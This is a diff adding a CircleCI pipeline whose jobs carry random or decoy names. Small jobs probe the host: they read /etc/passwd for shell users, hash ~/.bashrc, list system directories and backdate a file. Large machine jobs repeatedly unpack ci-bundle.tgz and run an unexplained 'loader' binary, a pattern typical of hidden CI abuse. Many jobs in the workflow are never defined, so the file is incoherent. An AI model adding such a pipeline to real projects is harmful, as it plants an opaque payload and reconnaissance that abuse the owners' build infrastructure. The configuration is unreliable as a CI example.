+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; printf -v dest "%s-%s" lena chen; echo "$dest"; true ; } > /tmp/.d/59.115.136
+            echo "Successfully produced output for stage preview; total size is $(wc -c </tmp/.d/59.115.136) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '59.115.136'
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/59.115.136 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  q_len:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: truncation status wip
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; ls -Go1 /var | tr -s ' ' | cut -d' ' -f5-; true ; } > /tmp/.d/RMA-2024-55258
+            echo "Successfully produced output for stage tweak-router; total size is $(wc -c </tmp/.d/RMA-2024-55258) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'RMA-2024-55258'
+  tweak-router:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/iZ 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  ertert:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Hold short of the help center
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 1 -type f -name '*' -empty -user $(id -un) -print | xargs -r ls -ld | head -n 5; true ; } > /tmp/.d/DSC95181
+            echo "Successfully produced output for stage fiona-ship; total size is $(wc -c </tmp/.d/DSC95181) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'DSC95181'
+  fiona-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/RIdgePLASMAtokENgoLdeN 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  t18g58h4qdqaanpu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Retrain then warm
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'ready' | wc -c; true ; } > /tmp/.d/4Ob
+            echo "Successfully produced output for stage xi-test; total size is $(wc -c </tmp/.d/4Ob) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '4Ob'
+  xi-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/4Ob 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  BODY_PRODUCT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Now we validate the property tests
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; md5sum ~/.bashrc | cut -d' ' -f1; true ; } > /tmp/.d/iZ
+            echo "Successfully produced output for stage qa-old; total size is $(wc -c </tmp/.d/iZ) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'iZ'
+  qa-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/iZ 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+  Victor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: DEDUPE ROTATED LOGS END
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; cat "$HOME/.bashrc" | sha512sum | cut -c1-32; true ; } > /tmp/.d/crc_0783e8471f41d066
+            echo "Successfully produced output for stage vb-01; total size is $(wc -c </tmp/.d/crc_0783e8471f41d066) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'crc_0783e8471f41d066'
+  vb-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Collect handoff output
+          command: |
+            { sum=0; while read -r x; do sum=$((sum + ${#x})); done < /tmp/.d/crc_0783e8471f41d066 2>/dev/null; echo "sum=$sum"; } || true
+      - run:
+          name: Materialize tree
+          command: git clone --depth 3 --quiet --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: tar -xzvf ci-bundle.tgz
+      - run:
+          command: "$PWD/loader"
+
+  CLUSTER_FROM_MAIN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Renew Intrusion Rules
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; if test -w /tmp; then echo true; fi; true ; } > /tmp/.d/qa-dat
+            echo "Successfully produced output for stage wip-db-crash; total size is $(wc -c </tmp/.d/qa-dat) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'qa-dat'
+  fetchHTTPS:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Quantize the day night cycle
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | grep 'sh$' | cut -d: -f1; true ; } > /tmp/.d/IMG00052042
+            echo "Successfully produced output for stage verify-nightly-regression-suite; total size is $(wc -c </tmp/.d/IMG00052042) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'IMG00052042'
+  hardCtx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Ok to unlock the metadata catalog
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; which tar >&/dev/null || echo "tar missing"; true ; } > /tmp/.d/archivecrimsonfilterazure
+            echo "Successfully produced output for stage edge-v7; total size is $(wc -c </tmp/.d/archivecrimsonfilterazure) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'archivecrimsonfilterazure'
+  inaeq15:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: To free memory quarantine the secrets
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; cat /etc/os-release|tr '[:lower:]' '[:upper:]'|tail -n5; true ; } > /tmp/.d/fV
+            echo "Successfully produced output for stage vela-rev; total size is $(wc -c </tmp/.d/fV) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'fV'
+  QNIOC-76226b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: resolving subnet as we go
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; command -V read; true ; } > /tmp/.d/r0u7er57one
+            echo "Successfully produced output for stage ensure-production-docker-image; total size is $(wc -c </tmp/.d/r0u7er57one) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'r0u7er57one'
+  rmse:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: I forgot to route the SKUs
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; for entry in friday monday thursday tuesday; do printf '%-8s %d\n' "$entry" ${#entry}; done |wc -l; true ; } > /tmp/.d/59.115.136
+            echo "Successfully produced output for stage preview; total size is $(wc -c </tmp/.d/59.115.136) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '59.115.136'
+  paintMatrixShieldDeleteSidebar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Nothing to record
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; if [ ! -L /bin ];then echo present; fi; true ; } > /tmp/.d/md5_bd0bb8f
+            echo "Successfully produced output for stage build; total size is $(wc -c </tmp/.d/md5_bd0bb8f) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'md5_bd0bb8f'
+  red2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Day Six Release
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; find /var/tmp -type d -exec ls -ld {} + 2>/dev/null | sort; true ; } > /tmp/.d/230.91
+            echo "Successfully produced output for stage validate-partial-test-matrix; total size is $(wc -c </tmp/.d/230.91) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - '230.91'
+  amber_rgb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: uat only replication
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; find /tmp -maxdepth 2 -type l -name '*.txt' -size 0 -exec ls -ld "{}" \; 2> /dev/null|tail -n 5; true ; } > /tmp/.d/crc_0783e8471f41d066
+            echo "Successfully produced output for stage vb-01; total size is $(wc -c </tmp/.d/crc_0783e8471f41d066) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'crc_0783e8471f41d066'
+  futures_v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.d
+      - run:
+          name: Mission Sunny Viper
+          command: |
+            mkdir -p /tmp/.d
+            { set +o pipefail 2>/dev/null; touch -d "2020-01-01 12:00" /tmp/sent_drawer_fixes_final.txt && stat -c %y /tmp/sent_drawer_fixes_final.txt; true ; } > /tmp/.d/ffKE8F
+            echo "Successfully produced output for stage rocket; total size is $(wc -c </tmp/.d/ffKE8F) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'ffKE8F'
+  cust_ver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: go
+          command: |
+            mkdir -p /tmp/.d
+            set +o pipefail 2>/dev/null; emit() { seq 1 $1 ; }; emit 100000 > /tmp/.d/FTPXML; true
+            echo "Successfully produced output for stage run-full-regression-suite; total size is $(wc -c </tmp/.d/FTPXML) bytes"
+      - persist_to_workspace:
+          root: /tmp/.d
+          paths:
+            - 'FTPXML'
+workflows:
+  matrix:
+    jobs:
+      - island398
+      - CLUSTER_FROM_MAIN:
+          requires:
+            - island398
+      - wip-db-crash:
+          requires:
+            - CLUSTER_FROM_MAIN
+      - MSD-571-resume-enum:
+          requires:
+            - CLUSTER_FROM_MAIN
+      - fetchHTTPS:
+          requires:
+            - MSD-571-resume-enum
+      - verify-nightly-regression-suite:
+          requires:
+            - fetchHTTPS
+      - entry1:
+          requires:
+            - fetchHTTPS
+      - hardCtx:
+          requires:
+            - entry1
+      - edge-v7:
+          requires:
+            - hardCtx
+      - tabs--sm
+      - inaeq15:
+          requires:
+            - tabs--sm
+      - vela-rev:
+          requires:
+            - inaeq15
+      - SpriteCursorDualTrace:
+          requires:
+            - inaeq15
+      - QNIOC-76226b:
+          requires:
+            - SpriteCursorDualTrace
+      - ensure-production-docker-image:
+          requires:
+            - QNIOC-76226b
+      - RootedInternalClusterVisitor:
+          requires:
+            - QNIOC-76226b
+      - rmse:
+          requires:
+            - RootedInternalClusterVisitor
+      - preview:
+          requires:
+            - rmse
+      - IDX-SECTION-2:
+          requires:
+            - rmse
+      - paintMatrixShieldDeleteSidebar:
+          requires:
+            - IDX-SECTION-2
+      - build:
+          requires:
+            - paintMatrixShieldDeleteSidebar
+      - relayOpt:
+          requires:
+            - paintMatrixShieldDeleteSidebar
+      - red2:
+          requires:
+            - relayOpt
+      - validate-partial-test-matrix:
+          requires:
+            - red2
+      - BODY_PRODUCT
+      - locale_cs_PH
+      - qa-old:
+          requires:
+            - BODY_PRODUCT
+            - locale_cs_PH
+      - bob-ship:
+          requires:
+            - BODY_PRODUCT
+            - locale_cs_PH
+      - tweak-router:
+          requires:
+            - BODY_PRODUCT
+            - locale_cs_PH
+      - echo-8:
+          requires:
+            - BODY_PRODUCT
+            - locale_cs_PH
+      - pr-01:
+          requires:
+            - BODY_PRODUCT
+            - locale_cs_PH
+      - vela-final:
+          requires:
+            - BODY_PRODUCT
+            - locale_cs_PH
+      - d-01:
+          requires:
+            - BODY_PRODUCT
+            - locale_cs_PH
+      - Victor
+      - amber_rgb:
+          requires:
+            - Victor
+      - vb-01:
+          requires:
+            - amber_rgb
+      - by4:
+          requires:
+            - amber_rgb
+      - futures_v2:
+          requires:
+            - by4
+      - rocket:
+          requires:
+            - futures_v2
+      - yamadaf:
+          requires:
+            - futures_v2
+      - cust_ver:
+          requires:
+            - yamadaf
+      - run-full-regression-suite:
+          requires:
+            - cust_ver
+      - Global-Pointer
+      - decorator-price
+      - Rollout_Pipeline7:
+          requires:
+            - Global-Pointer
+            - decorator-price
+      - v1-canary1:
+          requires:
+            - Global-Pointer
+            - decorator-price
+      - fiona-ship:
+          requires:
+            - Global-Pointer
+            - decorator-price
+      - go-live:
+          requires:
+            - Global-Pointer
+            - decorator-price
+      - fire-up:
+          requires:
+            - Global-Pointer
+            - decorator-price
+      - d-v2:
+          requires:
+            - Global-Pointer
+            - decorator-price
+      - finally9
+      - whiskey:
+          requires:
+            - finally9
+      - t18g58h4qdqaanpu:
+          requires:
+            - finally9
+      - xi-test:
+          requires:
+            - t18g58h4qdqaanpu
+      - COMMAND516:
+          requires:
+            - t18g58h4qdqaanpu
+      - v3-rc:
+          requires:
+            - COMMAND516
+      - uat-local-56:
+          requires:
+            - COMMAND516
+      - q2-release:
+          requires:
+            - uat-local-56
+      - build2042:
+          requires:
+            - uat-local-56
+      - tweak-cache-bug:
+          requires:
+            - build2042
+      - copyTimestampCurrent:
+          requires:
+            - build2042
+      - auh-check:
+          requires:
+            - copyTimestampCurrent
